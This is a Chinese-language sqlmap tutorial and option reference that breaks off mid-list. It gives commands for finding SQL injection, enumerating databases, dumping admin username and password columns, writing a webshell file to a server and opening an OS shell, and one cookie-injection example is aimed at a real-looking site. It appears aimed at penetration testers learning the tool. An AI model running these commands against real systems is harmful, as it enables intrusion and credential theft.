<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	http://www.vuln.cn/1992<br />
</h3>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	sqlmap简介
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap支持五种不同的注入模式：
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		4、联合查询注入，可以使用union的情况下的注入。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		5、堆查询注入，可以同时执行多条语句的执行时的注入。
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	sqlmap支持的数据库有
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
</p>
<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	检测注入
</h2>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	基本格式
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -u "http://www.vuln.cn/post.php?id=1"
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	默认使用level1检测全部数据库类型
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	跟随302跳转
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
目的就是：要追踪到错误信息。
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	cookie注入
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	当程序有防get注入的时候，可以使用cookie注入<br />
sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	从post数据包中注入
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	可以使用burpsuite或者temperdata等工具来抓取post包
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
</p>
<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	注入成功后
</h2>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	获取数据库基本信息
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	查询有哪些数据库
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	查询test数据库中有哪些表
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	查询test数据库中admin表有哪些字段
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	dump出字段username与password中的数据
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	其他命令参考下面
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	从数据库中搜索字段
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
在dedecms数据库中搜索字段admin或者password。
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	读取与写入文件
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	首先找需要网站的物理路径，其次需要有可写或可读权限。
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
#示例：<br />
sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	使用shell命令：
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
接下来指定网站可写目录：<br />
“E:\php\htdocs\dvwa”
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
</p>
<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	sqlmap详细命令：
</h2>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--is-dba 当前用户权限（是否为root权限）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--dbs 所有数据库
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--current-db 网站当前数据库
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--users 所有数据库用户
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--current-user 当前数据库用户
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--random-agent 构造随机user-agent
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--passwords 数据库密码
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
	</li>
</ul>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	——————————————————————————————————
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Options（选项）：
</h3>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--version 显示程序的版本号并退出
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-h, --help 显示此帮助消息并退出
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-v VERBOSE 详细级别：0-6（默认为1）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		保存进度继续跑：
	</li>
</ul>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Target（目标）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	以下至少需要设置其中一个选项，设置目标URL。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-d DIRECT 直接连接到数据库。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-u URL, --url=URL 目标URL。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-l LIST 从Burp或WebScarab代理的日志中解析目标。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-r REQUESTFILE 从一个文件中载入HTTP请求。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-c CONFIGFILE 从INI配置文件中加载选项。
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Request（请求）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以用来指定如何连接到目标URL。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--data=DATA 通过POST发送的数据字符串
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--cookie=COOKIE HTTP Cookie头
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--cookie-urlencode URL 编码生成的cookie注入
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--drop-set-cookie 忽略响应的Set - Cookie头信息
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--user-agent=AGENT 指定 HTTP User - Agent头
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--random-agent 使用随机选定的HTTP User - Agent头
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--referer=REFERER 指定 HTTP Referer头
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--headers=HEADERS 换行分开，加入其他的HTTP头
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--proxy=PROXY 使用HTTP代理连接到目标URL
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--ignore-proxy 忽略系统默认的HTTP代理
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--retries=RETRIES 连接超时后重新连接的时间（默认3）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--safe-url=SAFURL 在测试过程中经常访问的url地址
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Enumeration（枚举）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
您自己的SQL语句。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-b, --banner 检索数据库管理系统的标识
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--current-user 检索数据库管理系统当前用户
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--current-db 检索数据库管理系统当前数据库
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--is-dba 检测DBMS当前用户是否DBA
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--users 枚举数据库管理系统用户
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--passwords 枚举数据库管理系统用户密码哈希
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--privileges 枚举数据库管理系统用户的权限
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--roles 枚举数据库管理系统用户的角色
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--dbs 枚举数据库管理系统数据库
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-D DBname 要进行枚举的指定数据库名
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--tables 枚举的DBMS数据库中的表
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--columns 枚举DBMS数据库表列
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--dump 转储数据库管理系统的数据库中的表项
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--dump-all 转储所有的DBMS数据库表中的条目
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--search 搜索列（S），表（S）和/或数据库名称（S）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-C COL 要进行枚举的数据库列
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-U USER 用来进行枚举的数据库用户
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--exclude-sysdbs 枚举表时排除系统数据库
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--start=LIMITSTART 第一个查询输出进入检索
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--stop=LIMITSTOP 最后查询的输出进入检索
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--first=FIRSTCHAR 第一个查询输出字的字符检索
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--last=LASTCHAR 最后查询的输出字字符检索
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--sql-query=QUERY 要执行的SQL语句
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--sql-shell 提示交互式SQL的shell
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Optimization（优化）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可用于优化SqlMap的性能。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-o 开启所有优化开关
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--predict-output 预测常见的查询输出
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--keep-alive 使用持久的HTTP（S）连接
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--null-connection 从没有实际的HTTP响应体中检索页面长度
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Injection（注入）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-p TESTPARAMETER 可测试的参数（S）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--dbms=DBMS 强制后端的DBMS为此值
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--os=OS 强制后端的DBMS操作系统为这个值
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--prefix=PREFIX 注入payload字符串前缀
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--suffix=SUFFIX 注入payload字符串后缀
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Detection（检测）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--level=LEVEL 执行测试的等级（1-5，默认为1）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--risk=RISK 执行测试的风险（0-3，默认为1）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--string=STRING 查询时有效时在页面匹配字符串
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--text-only 仅基于在文本内容比较网页
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Techniques（技巧）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可用于调整具体的SQL注入测试。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--technique=TECH SQL注入技术测试（默认BEUST）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--union-cols=UCOLS 定列范围用于测试UNION查询注入
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--union-char=UCHAR 用于暴力猜解列数的字符
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Fingerprint（指纹）：
</h3>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-f, --fingerprint 执行检查广泛的DBMS版本指纹
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Brute force（蛮力）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以被用来运行蛮力检查。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--common-tables 检查存在共同表
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--common-columns 检查存在共同列
	</li>
</ul>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	User-defined function injection（用户自定义函数注入）：<br />
这些选项可以用来创建用户自定义函数。
</p>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	--udf-inject 注入用户自定义函数<br />
--shared-lib=SHLIB 共享库的本地路径
</p>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	File system access（访问文件系统）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Operating system access（操作系统访问）：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以用于访问后端数据库管理系统的底层操作系统。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--os-cmd=OSCMD 执行操作系统命令
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--os-shell 交互式的操作系统的shell
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--os-pwn 获取一个OOB shell，meterpreter或VNC
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--os-bof 存储过程缓冲区溢出利用
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--priv-esc 数据库进程用户权限提升
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--msf-path=MSFPATH Metasploit Framework本地的安装路径
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Windows注册表访问：
</h3>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以被用来访问后端数据库管理系统Windows注册表。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-read 读一个Windows注册表项值
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-add 写一个Windows注册表项值数据
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-del 删除Windows注册表键值
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-key=REGKEY Windows注册表键
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-value=REGVAL Windows注册表项值
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-data=REGDATA Windows注册表键值数据
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--reg-type=REGTYPE Windows注册表项值类型
	</li>
</ul>
<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	这些选项可以用来设置一些一般的工作参数。
</p>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
